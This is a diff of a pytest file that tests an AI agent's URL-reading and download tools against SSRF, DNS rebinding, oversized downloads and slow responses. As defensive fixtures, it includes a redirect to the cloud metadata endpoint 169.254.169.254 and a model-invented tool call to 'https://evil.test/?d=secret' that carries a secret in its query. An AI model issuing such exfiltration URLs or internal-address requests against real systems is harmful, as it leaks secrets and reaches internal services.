@@ -11,10 +11,10 @@ import subprocess
 import sys
 import tarfile
 import threading
+import time
 import uuid
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
-import httpcore
 import pytest
 from fastapi.testclient import TestClient
 
@@ -78,42 +78,30 @@ def test_a_mixed_dns_answer_is_refused(monkeypatch) -> None:
         asyncio.run(web.public_addresses("mixed.test", 443))
 
 
-def test_the_connection_uses_the_address_that_was_checked(monkeypatch) -> None:
-    """DNS rebinding: whatever a second lookup would say, the socket goes to the checked address only."""
-    _answers(monkeypatch, {"rebind.test": ["93.184.216.34"]})
-    dialed: list[str] = []
-
-    async def fake_connect(self, host, port, *args, **kwargs):
-        dialed.append(host)
-        raise httpcore.ConnectError("stop here")
-
-    monkeypatch.setattr(httpcore.AnyIOBackend, "connect_tcp", fake_connect)
-    with pytest.raises(web.WebError):
-        asyncio.run(web.read_url("https://rebind.test/x"))
-    assert dialed == ["93.184.216.34"]
-
-
 def test_a_host_resolving_inside_is_refused_before_connecting(monkeypatch) -> None:
     _answers(monkeypatch, {"inside.test": ["127.0.0.1"]})
-    dialed: list[str] = []
-
-    async def fake_connect(self, host, port, *args, **kwargs):
-        dialed.append(host)
-
-    monkeypatch.setattr(httpcore.AnyIOBackend, "connect_tcp", fake_connect)
     with pytest.raises(web.WebError, match="non-public"):
         asyncio.run(web.read_url("http://inside.test/"))
-    assert dialed == []
 
 
 # ---- a local stand-in for the public internet ---------------------------------------------------
 
 
 class _Handler(BaseHTTPRequestHandler):
+    requests: list[dict] = []
+
     def log_message(self, *args):
         pass
 
     def do_GET(self):
+        self.requests.append(
+            {
+                "path": self.path,
+                "user-agent": self.headers.get("user-agent"),
+                "accept": self.headers.get("accept"),
+                "accept-language": self.headers.get("accept-language"),
+            }
+        )
         if self.path == "/to-metadata":
             self.send_response(302)
             self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
@@ -124,11 +112,30 @@ class _Handler(BaseHTTPRequestHandler):
             self.end_headers()
         elif self.path == "/page":
             body = b'<html><title>T</title><a href="/next">n</a><a href="https://other.test/x#f">o</a><p>hello</p></html>'
+            self._send(body, "text/html")
+        elif self.path == "/article":
+            body = (
+                '<html><head><title>Article</title></head><body><nav><a href="/menu">menu</a></nav><article><h1>H</h1>'
+                f'<p>{"正文内容。" * 80}<a href="/ref">引用</a></p><p>{"更多正文。" * 80}</p></article></body></html>'
+            ).encode()
+            self._send(body, "text/html")
+        elif self.path == "/markdown":
+            body = ("# Markdown 标题\n\n" + "Markdown 正文。\n" * 120).encode()
+            self._send(body, "text/markdown")
+        elif self.path == "/negotiate":
+            if "text/markdown" in (self.headers.get("accept") or ""):
+                self.send_response(403)
+                self.end_headers()
+            else:
+                self._send(f"<html><body><article><p>{'普通 HTML 正文。' * 80}</p></article></body></html>".encode(), "text/html")
+        elif self.path == "/trickle":
             self.send_response(200)
             self.send_header("Content-Type", "text/html")
-            self.send_header("Content-Length", str(len(body)))
             self.end_headers()
-            self.wfile.write(body)
+            for _ in range(20):
+                self.wfile.write(b"x" * 16)
+                self.wfile.flush()
+                time.sleep(0.05)
         elif self.path == "/declared-big":
             self.send_response(200)
             self.send_header("Content-Length", str(10 * 1024 * 1024))
@@ -149,41 +156,98 @@ class _Handler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
 
+    def _send(self, body: bytes, content_type: str) -> None:
+        self.send_response(200)
+        self.send_header("Content-Type", content_type)
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
 
 @pytest.fixture()
 def internet(monkeypatch):
+    _Handler.requests = []
     server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
     threading.Thread(target=server.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True).start()
     port = server.server_address[1]
     real_check = web.public_addresses
 
     async def addresses(host, p):
-        if host == "public.test":  # pretend the loopback test server is a public host
+        if host in ("public.test", "pinned.invalid"):  # pretend the loopback test server is a public host
             return ["127.0.0.1"]
         return await real_check(host, p)
 
-    original = httpcore.AnyIOBackend.connect_tcp
-
-    async def connect(self, host, p, *args, **kwargs):
-        return await original(self, host, port if host == "127.0.0.1" else p, *args, **kwargs)
-
     monkeypatch.setattr(web, "public_addresses", addresses)
-    monkeypatch.setattr(httpcore.AnyIOBackend, "connect_tcp", connect)
+    monkeypatch.setattr(web, "ALLOWED_PORTS", (80, 443, port))
     _answers(monkeypatch, {"inside.test": ["10.0.0.7"]})
-    yield
+    yield {"port": port, "requests": _Handler.requests}
     server.shutdown()
 
 
 def test_redirects_into_metadata_or_inside_hosts_are_refused(internet) -> None:
     with pytest.raises(web.WebError, match="non-public"):
-        asyncio.run(web.read_url("http://public.test/to-metadata"))
+        asyncio.run(web.read_url(f"http://public.test:{internet['port']}/to-metadata"))
     with pytest.raises(web.WebError, match="non-public"):
-        asyncio.run(web.read_url("http://public.test/to-inside"))
+        asyncio.run(web.read_url(f"http://public.test:{internet['port']}/to-inside"))
 
 
 def test_read_url_returns_absolute_links(internet) -> None:
-    page = asyncio.run(web.read_url("http://public.test/page"))
-    assert "hello" in page["text"] and page["links"] == ["http://public.test/next", "https://other.test/x"]
+    page = asyncio.run(web.read_url(f"http://public.test:{internet['port']}/page"))
+    assert "hello" in page["text"]
+    assert page["links"] == [f"http://public.test:{internet['port']}/next", "https://other.test/x"]
+
+
+def test_read_url_pins_the_checked_address_and_ignores_environment_proxies(internet, monkeypatch) -> None:
+    monkeypatch.setenv("http_proxy", "http://127.0.0.1:9")
+    monkeypatch.setenv("https_proxy", "http://127.0.0.1:9")
+    page = asyncio.run(web.read_url(f"http://pinned.invalid:{internet['port']}/article"))
+    assert "正文内容" in page["text"]
+    (request,) = internet["requests"]
+    assert request["user-agent"].startswith("Mozilla/5.0") and "Chrome/" in request["user-agent"]
+    assert request["accept"].startswith("text/markdown")
+    assert request["accept-language"].startswith("zh-CN")
+
+
+def test_read_url_prefers_article_links_within_the_content(internet) -> None:
+    page = asyncio.run(web.read_url(f"http://public.test:{internet['port']}/article"))
+    assert page["links"] == [f"http://public.test:{internet['port']}/ref"]
+
+
+def test_markdown_negotiation_returns_the_body_without_html_extraction(internet) -> None:
+    page = asyncio.run(web.read_url(f"http://public.test:{internet['port']}/markdown"))
+    assert page["content_type"] == "text/markdown"
+    assert page["text"].startswith("# Markdown 标题")
+    assert len(internet["requests"]) == 1
+
+
+def test_read_url_refuses_binary_content(internet) -> None:
+    with pytest.raises(web.WebError, match="download_url"):
+        asyncio.run(web.read_url(f"http://public.test:{internet['port']}/file.png"))
+
+
+def test_a_markdown_403_is_retried_once_with_an_html_accept(internet) -> None:
+    page = asyncio.run(web.read_url(f"http://public.test:{internet['port']}/negotiate"))
+    assert "普通 HTML 正文" in page["text"]
+    accepts = [request["accept"] for request in internet["requests"]]
+    assert len(accepts) == 2
+    assert "text/markdown" in accepts[0] and accepts[1].startswith("text/html")
+
+
+def test_read_url_total_deadline_bounds_a_trickling_response(internet, monkeypatch) -> None:
+    monkeypatch.setattr(web.settings, "web_read_deadline_seconds", 0.25)
+    with pytest.raises(web.WebError, match="超时"):
+        asyncio.run(web.read_url(f"http://public.test:{internet['port']}/trickle"))
+
+
+def test_dns_lookup_has_its_own_short_timeout(monkeypatch) -> None:
+    def slow(*args, **kwargs):
+        time.sleep(0.3)
+        raise socket.gaierror("slow")
+
+    monkeypatch.setattr(web.socket, "getaddrinfo", slow)
+    monkeypatch.setattr(web, "DNS_TIMEOUT_SECONDS", 0.05)
+    with pytest.raises(web.WebError, match="timed out"):
+        asyncio.run(web.public_addresses("slow.test", 443))
 
 
 def test_downloads_stop_at_the_limit_and_leave_nothing_behind(internet, monkeypatch) -> None:
@@ -192,7 +256,7 @@ def test_downloads_stop_at_the_limit_and_leave_nothing_behind(internet, monkeypa
             return got
 
     with pytest.raises(web.WebError, match="limit"):
-        asyncio.run(fetch("http://public.test/declared-big"))
+        asyncio.run(fetch(f"http://public.test:{internet['port']}/declared-big"))
     seen = []
     original = web.tempfile.TemporaryDirectory
 
@@ -203,7 +267,7 @@ def test_downloads_stop_at_the_limit_and_leave_nothing_behind(internet, monkeypa
 
     monkeypatch.setattr(web.tempfile, "TemporaryDirectory", tracked)
     with pytest.raises(web.WebError, match="exceeds"):
-        asyncio.run(fetch("http://public.test/chunked-big"))
+        asyncio.run(fetch(f"http://public.test:{internet['port']}/chunked-big"))
     assert seen and not any(__import__("os").path.exists(d) for d in seen)
 
 
@@ -222,8 +286,8 @@ class _Broker:
 
 def test_download_url_streams_into_the_sandbox_and_counts_the_budget(internet) -> None:
     broker, budget = _Broker(), net_tools.Budget()
-    sources = {"http://public.test/file.png"}
-    out = asyncio.run(net_tools.download_url({"url": "http://public.test/file.png"}, "l1", broker, sources, budget))
+    url = f"http://public.test:{internet['port']}/file.png"
+    out = asyncio.run(net_tools.download_url({"url": url}, "l1", broker, {url}, budget))
     assert out["path"] == "/workspace/downloads/file.png" and broker.files[out["path"]] == b"\x89PNG"
     assert budget.bytes == 4 and budget.requests == 1
 
@@ -253,16 +317,30 @@ def test_only_urls_from_the_user_or_web_results_can_be_fetched() -> None:
             net_tools.check_source(refused, sources)
 
 
-def test_read_url_refuses_an_invented_url_without_any_request(monkeypatch) -> None:
+def test_read_url_with_an_invented_url_returns_the_search_results_instead(monkeypatch) -> None:
+    """One search replaces the extra model round trip, and the model still chooses the final URL."""
     monkeypatch.setattr(web.settings, "web_search_provider", "mock")
 
     async def never(*args, **kwargs):
-        raise AssertionError("no request may be made")
+        raise AssertionError("no page may be read")
 
     monkeypatch.setattr(web, "read_url", never)
     ctx = tools.ToolContext(messages=[{"role": "user", "content": "帮我查资料"}])
-    with pytest.raises(tools.ToolError, match="did not come from"):
-        asyncio.run(tools.execute_tool("read_url", {"url": "https://evil.test/?d=secret"}, "", None, ctx))
+    result = asyncio.run(tools.execute_tool("read_url", {"url": "https://evil.test/?d=secret"}, "", None, ctx))
+    assert result["ok"] is False and "did not come from" in result["error"]
+    assert [hit["url"] for hit in result["results"]] == [f"https://example.com/{i}" for i in range(1, 6)]
+    assert ctx.budget.requests == 1
+
+    # The URLs in that error result are now provenance for the rest of the run.
+    ctx.messages.append(tools.tool_result_message("c1", "read_url", result))
+
+    async def page(url, max_chars=None):
+        return {"url": url, "title": "Example", "text": "正文", "links": [], "truncated": False}
+
+    monkeypatch.setattr(web, "read_url", page)
+    read = asyncio.run(tools.execute_tool("read_url", {"url": "https://example.com/2"}, "", None, ctx))
+    assert read["ok"] is True and read["url"] == "https://example.com/2"
+    assert ctx.budget.requests == 2  # the supplemental search, then the read
 
 
 def test_the_run_budget_caps_requests_and_bytes(monkeypatch) -> None:
